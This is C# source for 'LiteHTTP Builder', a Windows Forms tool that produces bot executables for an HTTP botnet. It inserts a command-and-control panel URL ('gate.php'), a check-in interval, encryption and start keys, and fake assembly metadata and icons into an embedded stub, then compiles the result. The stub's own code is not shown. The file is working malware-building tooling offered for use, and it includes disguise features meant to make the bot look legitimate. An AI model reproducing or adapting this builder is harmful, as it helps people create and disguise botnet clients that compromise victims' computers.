using System;
using System.Data;
using System.Text;
using System.Drawing;
using Microsoft.CSharp;
using System.Windows.Forms;
using System.ComponentModel;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Security.Cryptography;
using Microsoft.VisualBasic.Devices;

namespace LiteHTTP_Builder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void CompileApplication(string source, string destination, string resource, string success)
        {
            CSharpCodeProvider ic = new CSharpCodeProvider(new Dictionary<string, string> { { "CompilerVersion", "v2.0" } });
            CompilerParameters cp = new CompilerParameters();
            CompilerResults cr;
            var Version = new Dictionary<string, string>();
            cp.IncludeDebugInformation = false;
            cp.GenerateExecutable = true;
            cp.GenerateInMemory = false;
            cp.ReferencedAssemblies.Add("System.dll");
            cp.ReferencedAssemblies.Add("System.Drawing.dll");
            cp.ReferencedAssemblies.Add("System.Management.dll");
            cp.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            cp.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
            cp.CompilerOptions = "/filealign:0x00200 /optimize+ /platform:X86 /debug- /target:winexe";
            Version.Add("CompilerVersion", "v2.0");
            if (resource.Length > 3)
            {
                cp.EmbeddedResources.Add(resource);
            }
            if (checkBox2.Checked)
            {
                cp.CompilerOptions += " /win32icon:" + Environment.GetEnvironmentVariable("windir") + "\\Temp\\icon.ico";
            }
            cp.OutputAssembly = destination;

            cr = ic.CompileAssemblyFromSource(cp, source);
            if (cr.Errors.Count > 0)
            {
                foreach (CompilerError error in cr.Errors)
                {
                    MessageBox.Show(error.Line + ": " + error.ErrorText, "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return;
            }
            if (success != null)
            {
                MessageBox.Show(success, "", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        public static string hash(string input)
        {
            MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();
            byte[] temp = md5.ComputeHash(Encoding.Default.GetBytes(input));
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < temp.Length; i++)
            {
                sb.Append(temp[i].ToString("x2"));
            }
            return sb.ToString();
        }
        public static string randomString(int length)
        {
            char[] b = "a1b2c3d4e5fZ6YgX7WhV8UiT9SjR0QkPlOmNnMoLpKqJrIsHtGuFvEwDxCyBzA".ToCharArray();
            Microsoft.VisualBasic.VBMath.Randomize();
            StringBuilder s = new StringBuilder();
            for (int i = 1; i < length; i++)
            {
                int z = ((int)(((b.Length - 2) + 1) * Microsoft.VisualBasic.VBMath.Rnd())) + 1;
                s.Append(b[z]);
            }
            return s.ToString();
        }
        public string generateKey()
        {
            string res = randomString(7);
            res += textBox1.Text;
            res += randomString(7);
            return hash(res);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.Filter = "Icons (*.ico)|*.ico";
            if (OFD.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                System.IO.File.Copy(OFD.FileName, Environment.GetEnvironmentVariable("windir") + "\\Temp\\icon.ico", true);
                textBox5.Text = OFD.FileName;
                pictureBox1.ImageLocation = OFD.FileName;
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            textBox3.Text = generateKey();
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            textBox3.Text = generateKey();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            textBox3.Text = generateKey();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            MessageBox.Show("*PANEL URL*" + Environment.NewLine + "This is the URL to your panel. This is the full path to your gate file, ex: http://google.com/gate.php" +  
                            Environment.NewLine + Environment.NewLine + "*REQUEST INTERVAL*" + Environment.NewLine + "This is the interval at which your bot checks in with the panel (in minutes).", "Help", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "" || textBox3.Text == "" || textBox4.Text == "")
            {
                MessageBox.Show("Please fill in all fields.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }
            SaveFileDialog SFD = new SaveFileDialog();
            SFD.Filter = "Executables (*.exe)|*.exe";
            if (SFD.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                string stub = Properties.Resources.stub;
                stub = stub.Replace("#panelurl#", textBox1.Text);
                stub = stub.Replace("#rint#", numericUpDown1.Value.ToString());
                stub = stub.Replace("#encryptionkey#", textBox3.Text);
                stub = stub.Replace("#startkey#", textBox4.Text);
                stub = stub.Replace("#assemtitle#", textBox6.Text);
                stub = stub.Replace("#assemdesc#", textBox7.Text);
                stub = stub.Replace("#assemcomp#", textBox8.Text);
                stub = stub.Replace("#assemprod#", textBox9.Text);
                stub = stub.Replace("#assemcopy#", textBox10.Text);
                CompileApplication(stub, SFD.FileName, "", "Successfully built bin.");
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (System.IO.File.Exists(Environment.GetEnvironmentVariable("windir") + "\\Temp\\icon.ico"))
                System.IO.File.Delete(Environment.GetEnvironmentVariable("windir") + "\\Temp\\icon.ico");
        }
    }
}
